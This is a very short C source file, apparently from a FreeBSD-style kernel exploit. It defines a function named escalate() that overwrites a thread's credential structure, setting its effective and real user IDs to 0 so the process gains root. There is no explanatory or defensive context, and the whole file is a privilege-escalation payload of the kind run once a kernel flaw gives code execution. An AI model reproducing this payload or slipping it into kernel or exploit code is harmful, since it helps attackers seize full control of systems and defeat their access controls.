#include "extSec.h"

void escalate(struct thread *td) {
	td->td_ucred->cr_uid = 0;
	td->td_ucred->cr_ruid = 0;
}
